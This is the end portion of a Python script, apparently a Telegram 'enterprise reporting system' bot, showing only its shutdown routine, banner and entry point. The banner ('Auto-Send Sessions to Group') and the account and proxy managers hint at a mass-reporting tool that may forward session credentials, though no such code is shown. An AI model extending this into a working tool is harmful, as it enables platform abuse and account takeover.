        console.print("[yellow]🔧 Shutting down enterprise system...[/yellow]")
        try:
            if hasattr(self, 'reporting_engine'):
                await self.reporting_engine.cleanup()
            if hasattr(self, 'account_manager'):
                await self.account_manager.cleanup()
            if hasattr(self, 'proxy_manager'):
                await self.proxy_manager.cleanup()
            if hasattr(self, 'user_manager'):
                self.user_manager._save_users()
            if hasattr(self, 'application'):
                if hasattr(self.application, 'updater'):
                    await self.application.updater.stop()
                await self.application.stop()
                await self.application.shutdown()
            console.print("[green]✅ Enterprise system shutdown complete[/green]")
            console.print("[cyan]👋 Goodbye![/cyan]")
        except Exception as e:
            console.print(f"[red]❌ Shutdown error: {e}[/red]")
            import traceback
            traceback.print_exc()

    def _print_system_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                TELEGRAM ENTERPRISE REPORTING SYSTEM v11.0                   ║
║                       Pyrogram Edition – Fully Fixed                        ║
║                          + Auto‑Send Sessions to Group                      ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """
        console.print(f"[bright_cyan]{banner}[/bright_cyan]")

# ============================================
# MAIN ENTRY POINT
# ============================================
async def main():
    console.print("[bright_cyan]⚡ ENTERPRISE TELEGRAM REPORTING SYSTEM v11.0 (Pyrogram – Full)[/bright_cyan]")
    console.print("[cyan]Starting main application...[/cyan]")
    enterprise_bot = TelegramEnterpriseBot()
    try:
        await enterprise_bot.run()
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️ Received interrupt signal[/yellow]")
    except Exception as e:
        console.print(f"[red]❌ Fatal error: {e}[/red]")
        import traceback
        traceback.print_exc()
    console.print("[cyan]Application terminated.[/cyan]")

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[yellow]👋 Application terminated by user[/yellow]")
    except Exception as e:
        console.print(f"[red]❌ Critical error: {e}[/red]")
        import traceback
        traceback.print_exc()
        sys.exit(1)
